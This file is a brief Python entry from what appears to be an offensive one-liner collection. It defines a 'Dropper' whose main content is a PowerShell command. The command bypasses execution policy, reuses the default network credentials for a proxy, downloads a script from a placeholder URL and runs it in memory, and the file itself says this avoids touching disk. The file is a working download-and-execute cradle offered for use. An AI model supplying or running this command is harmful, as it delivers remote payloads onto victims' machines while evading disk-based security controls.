class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses powershell to execute your ps1 script on the fly without touching disk."
    function    = "Dropper"
    liner     = "powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('URL')|iex\""
